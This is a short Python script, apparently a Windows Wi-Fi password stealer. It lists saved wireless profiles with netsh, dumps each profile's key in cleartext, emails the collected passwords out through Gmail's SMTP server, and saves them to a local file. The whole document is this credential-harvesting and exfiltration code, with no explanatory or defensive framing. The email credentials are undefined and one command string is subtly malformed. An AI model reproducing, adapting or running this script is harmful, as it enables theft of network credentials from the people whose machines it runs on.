import smtplib
import ssl
import subprocess
import re

cmd= "netsh wlan show profile"
networks = subprocess.check_output(cmd, shell=True)
networkList = re.findall('(?:profile\s*:\s)(.*)'  , networks)

finalOutput = ""
for network in networkList:
    showKey = "netsh wlan show profile " + network + "key=clear"
    oneNetworkResult = subprocess.check_output(showKey, shell=True)
    finalOutput += oneNetworkResult

#Have Output Sent as an Email
context = ssl.create_default_context()
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls(context=context)
server.login(email,password)
server.sendmail(email, email, finalOutput)

#Have Output Saved to File
file = open("wifiPasswords.txt", "w")
file.write(finalOutput)
file.close()